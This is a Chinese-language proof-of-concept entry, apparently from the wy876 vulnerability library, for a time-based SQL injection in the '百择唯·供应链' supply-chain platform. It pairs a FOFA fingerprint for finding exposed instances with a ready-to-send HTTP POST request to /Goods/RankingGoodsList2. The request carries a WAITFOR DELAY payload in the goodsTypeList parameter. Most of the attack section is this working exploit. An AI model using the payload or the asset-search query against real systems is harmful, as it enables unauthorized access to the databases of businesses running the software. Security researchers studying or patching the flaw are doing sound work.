---
fofa: "body="
source: "wy876 漏洞文库"
---

# 百择唯·供应链 RankingGoodsList2存在SQL注入漏洞

# 一、漏洞简介
懂微科技是一家专注于办公服务行业电商解决方案的提供商，致力于为办公服务行业赋能、提升效率和核心竞争力。百择唯·供应链作为懂微科技的重要产品之一，旨在通过数字化手段优化办公服务行业的供应链管理,提升采购效率，降低采购成本，增强企业的盈利能力。适用于各种需要优化供应链管理、提升采购效率的企业。同时，通过与合作伙伴的共享共建，构建完善的供应链生态体系，提升整体运营效率和市场竞争力。百择唯·供应链 RankingGoodsList2存在SQL注入漏洞

# 二、影响版本
+ 百择唯·供应链

# 三、资产测绘
+ fofa`body="/Content/Css/_SiteCss/"`
+ 特征


# 四、漏洞复现
```java
POST /Goods/RankingGoodsList2 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
 
goodsSortType=Recommend&goodsTypeList%5B%5D=1%';WAITFOR DELAY '0:0:5'--
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gqpnlboq0dt6c1f1>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
